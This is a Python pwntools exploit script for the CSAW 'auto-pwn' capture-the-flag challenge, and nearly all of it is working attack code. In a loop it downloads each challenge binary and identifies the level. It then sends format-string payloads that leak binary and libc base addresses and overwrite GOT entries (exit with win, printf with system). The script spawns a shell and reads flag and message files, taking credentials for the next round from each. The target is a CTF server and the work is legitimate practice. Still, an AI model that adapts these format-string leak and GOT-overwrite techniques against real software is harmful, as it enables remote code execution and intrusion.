#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from os import system
import re

host = 'auto-pwn.chal.csaw.io'
port = 11001
password = b'cd80d3cd8a479a18bbc9652f3631c61c'

#? Return address for the third level
FGETS_IN_MAIN = 0x401AFB

def get_binary_from_xxd():
    r = b'-------------------------------------------------------------------\n'
    io.recvuntil(r)
    elf_xxd = io.recvuntil(r)[:-len(r)]
    with open(f'binary_{i}.txt', 'wb') as f:
        f.write(elf_xxd)
    system(f'cat binary_{i}.txt | xxd -r > elf_{i}')

for i in range(1, 51 + 1):

    io = connect(host, port)

    io.warn('Try ' + str(i))

    io.sendlineafter(b'> ', password)
    get_binary_from_xxd()

    exe = context.binary = ELF(f'./elf_{i}')

    level = io.recvuntil(b'> ')
    level = re.findall(b'Simulator ([A-Za-z]+ [A-Za-z]+)', level)[0]
    io.warn(b"========= " + level + b" =========")

    if b'Two' in level or b'One' in level:
        WIN = exe.functions['win'].address

    EXIT = exe.got['exit']

    #? Fourth level
    #? PIE enabled
    #? Missing SYSTEM function
    #? It is necessary to leak the address of the binary and libc
    if b'Four' in level:
        #? Saved libc from leaked address
        libc = ELF('./libc/libc.so.6')
        
        #? Leak binary and libc addresses
        io.sendline(b'%32$p|%45$p')
        io.recvuntil(b'0x')
        res = (b'0x' + io.recvline()[:-1]).split(b'|')

        #? Calculating base address of binary
        _start  = int(res[0], 16)
        base_addr = _start - 0x11a0
        io.warn(f'BASE BINARY: 0x{base_addr:x}')
        exe.address = base_addr

        #? Calculating base address of libc
        _start_main_ret = int(res[1], 16)
        libc_base_address = _start_main_ret - 0x0270b3
        io.warn(f'LEAK _start_main_ret: 0x{_start_main_ret:x}')
        io.warn(f'BASE LIBC: 0x{libc_base_address:x}')
        libc.address = libc_base_address

        PRINTF = exe.got['printf']
        SYSTEM = libc.sym['system']

        #? Rewrite PRINTF function with SYSTEM
        payload = fmtstr_payload(8, {PRINTF:SYSTEM}, write_size='byte')
        io.warn(f'Len: {len(payload)}, Payload: {payload}')
        io.sendline(payload)
        sleep(1)
        io.sendline(b'/bin/sh')

    #? Third level
    #? Missing WIN function
    #? Stripped binary
    elif b'Three' in level:
        PRINTF = exe.got['printf']
        SYSTEM = 0x401124

        #? rewrite PRINTF with SYSTEM and EXIT with address before calling FGETS
        payload = fmtstr_payload(6, {EXIT: FGETS_IN_MAIN, PRINTF:SYSTEM}, write_size='byte')
        io.warn(f'Len: {len(payload)}, Payload: {payload}')
        io.sendline(payload)
        sleep(1)
        io.sendline(b'/bin/sh')
    else:
        #? Second level
        #? x86_64 arch
        if context.arch == 'amd64':
            payload = fmtstr_payload(6, {EXIT: WIN}, write_size='byte')
        #? First level
        #? i386 arch
        else:
            payload = b'||' + fmtstr_payload(6, {EXIT: WIN}, numbwritten=2, write_size='byte')

        io.sendline(payload)
        io.warn(f'Len: {len(payload)}, Payload: {payload}')

    if i == 50:
        io.sendline(b'cat flag.txt')
        system(f'rm binary_{i}.txt elf_{i}')
        break

    io.sendline(b'cat message.txt')
    io.recvuntil(b'auto-pwn.chal.csaw.io ')
    port = int(io.recvuntil(b' and')[:-4])
    io.recvuntil(b'password ')
    password = io.recvline()[:-1]

    io.warn('PORT: '     + str(port))
    io.warn('PASSWORD: ' + str(password))

    system(f'rm binary_{i}.txt elf_{i}')

    io.close()

io.interactive()
